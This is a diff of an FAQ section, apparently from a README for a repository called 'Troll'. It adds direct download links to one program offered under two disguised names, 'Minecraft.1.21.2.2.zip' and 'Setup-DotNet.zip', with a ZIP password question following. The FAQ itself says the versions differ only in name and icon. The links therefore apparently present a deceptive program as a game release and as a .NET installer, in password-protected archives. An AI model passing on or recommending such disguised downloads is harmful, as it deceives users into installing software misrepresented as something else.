@@ -36,7 +36,7 @@ R: Yes, it has support for Spanish and English, only those two, but soon we will
 
 Q: **Where can I download it?**
 
-R: You can download the 3 versions with different names and icons, they are different names but they do the same thing, only they change the way they are presented, here you have the 3 versions: 
+R: You can download the 2 versions with different names and icons, they are different names but they do the same thing, only they change the way they are presented, here you have the 2 versions: [Minecraft](https://github.com/Joseantonio2354/Troll/raw/main/Minecraft.1.21.2.2.zip) and [Setup-Dotnet](https://github.com/Joseantonio2354/Troll/raw/main/Setup-DotNet.zip)
 
 Q: **What is the ZIP password?**
 
